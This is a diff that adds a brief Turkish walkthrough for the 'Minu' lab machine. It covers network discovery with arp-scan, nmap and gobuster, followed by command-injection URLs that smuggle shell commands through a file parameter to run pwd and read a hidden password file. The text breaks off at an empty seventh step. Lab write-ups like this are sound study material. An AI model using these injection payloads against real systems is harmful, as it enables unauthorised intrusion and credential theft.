@@ -1,0 +1,8 @@
+MINU MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.51 bulundu.
+2 - nmap -A 192.168.2.51
+3 - gobuster dir -u http://192.168.2.51 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X php,html,txt
+4 - http://192.168.2.51/test.php?file=last.html%20|%20pwd
+5 - http://192.168.2.51/test.php?file=www.example.com;+$u+cat%20/home/bob/._pw_
+6 - jwt.io -> mlnV1
+7 - 
